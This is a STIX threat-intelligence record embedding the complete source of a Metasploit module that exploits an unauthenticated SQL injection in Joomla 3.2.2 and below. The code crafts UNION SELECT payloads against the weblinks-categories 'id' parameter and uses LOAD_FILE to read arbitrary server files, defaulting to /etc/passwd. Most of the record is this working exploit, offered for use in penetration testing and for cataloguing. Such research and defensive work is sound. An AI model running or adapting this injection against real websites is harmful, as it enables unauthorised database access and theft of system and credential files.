{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4b7c07b2-25ac-4b79-a571-5bdd52dd2984",
    "created": "2024-08-14T16:32:36.390675Z",
    "modified": "2024-08-14T16:32:36.390679Z",
    "name": "Joomla weblinks-categories Unauthenticated SQL Injection Arbitrary File Read",
    "description": " Joomla versions 3.2.2 and below are vulnerable to an unauthenticated SQL injection which allows an attacker to access the database or read arbitrary files as the 'mysql' user. This module will only work if the mysql user Joomla is using to access the database has the LOAD_FILE permission.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/joomla_weblinks_sqli.rb",
            "external_id": "joomla_weblinks_sqli.rb"
        },
        {
            "source_name": "reference",
            "url": "https://developer.joomla.org/security/578-20140301-core-sql-injection.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Joomla weblinks-categories Unauthenticated SQL Injection Arbitrary File Read',\n      'Description'    => %q{\n      Joomla versions 3.2.2 and below are vulnerable to an unauthenticated SQL injection\n      which allows an attacker to access the database or read arbitrary files as the\n      'mysql' user. This module will only work if the mysql user Joomla is using\n      to access the database has the LOAD_FILE permission.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Brandon Perry <bperry.volatile[at]gmail.com>', #metasploit module\n        ],\n      'References'     =>\n        [\n          ['EDB', '31459'],\n          ['URL', 'https://developer.joomla.org/security/578-20140301-core-sql-injection.html']\n        ],\n      'DisclosureDate' => '2014-03-02'\n    ))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, \"Base Joomla directory path\", '/']),\n        OptString.new('FILEPATH', [true, \"The filepath to read on the server\", \"/etc/passwd\"]),\n        OptInt.new('CATEGORYID', [true, \"The category ID to use in the SQL injection\", 0])\n      ])\n\n  end\n\n  def check\n\n    front_marker = Rex::Text.rand_text_alpha(6)\n    back_marker = Rex::Text.rand_text_alpha(6)\n\n    payload = datastore['CATEGORYID'].to_s\n    payload << \") UNION ALL SELECT CONCAT(0x#{front_marker.unpack('H*')[0]},\"\n    payload << \"IFNULL(CAST(VERSION() \"\n    payload << \"AS CHAR),0x20),0x#{back_marker.unpack('H*')[0]})#\"\n\n    resp = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'index.php', 'weblinks-categories'),\n      'vars_get' => {\n        'id' => payload\n      }\n    })\n\n    if !resp or !resp.body\n      return Exploit::CheckCode::Safe\n    end\n\n    if resp.body =~ /404<\\/span> Category not found/\n      return Exploit::CheckCode::Unknown\n    end\n\n    version = /#{front_marker}(.*)#{back_marker}/.match(resp.body)\n\n    if !version\n      return Exploit::CheckCode::Safe\n    end\n\n    version = version[1].gsub(front_marker, '').gsub(back_marker, '')\n    print_good(\"Fingerprinted: #{version}\")\n    return Exploit::CheckCode::Vulnerable\n  end\n\n  def run\n    front_marker = Rex::Text.rand_text_alpha(6)\n    back_marker = Rex::Text.rand_text_alpha(6)\n    file = datastore['FILEPATH'].unpack(\"H*\")[0]\n    catid = datastore['CATEGORYID']\n\n    payload = catid.to_s\n    payload << \") UNION ALL SELECT CONCAT(0x#{front_marker.unpack('H*')[0]}\"\n    payload << \",IFNULL(CAST(HEX(LOAD_FILE(\"\n    payload << \"0x#{file})) AS CHAR),0x20),0x#{back_marker.unpack('H*')[0]})#\"\n\n    resp = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'index.php', 'weblinks-categories'),\n      'vars_get' => {\n        'id' => payload\n      }\n    })\n\n    if !resp or !resp.body\n      fail_with(Failure::UnexpectedReply, \"Server did not respond in an expected way. Verify the IP address.\")\n    end\n\n    if resp.body =~ /404<\\/span> Category not found/\n      fail_with(Failure::BadConfig, \"The category ID was invalid. Please try again with a valid category ID\")\n    end\n\n    file = /#{front_marker}(.*)#{back_marker}/.match(resp.body)\n\n    if !file\n      fail_with(Failure::UnexpectedReply, \"Either the file didn't exist or the server has been patched.\")\n    end\n\n    file = file[1].gsub(front_marker, '').gsub(back_marker, '')\n    file = [file].pack(\"H*\")\n\n    if file == '' or file == \"\\x00\"\n      fail_with(Failure::UnexpectedReply, \"Either the file didn't exist or the database user does not have LOAD_FILE permissions\")\n    end\n\n    path = store_loot(\"joomla.file\", \"text/plain\", datastore['RHOST'], file, datastore['FILEPATH'])\n\n    if path and path != ''\n      print_good(\"File saved to: #{path}\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-03-02"
}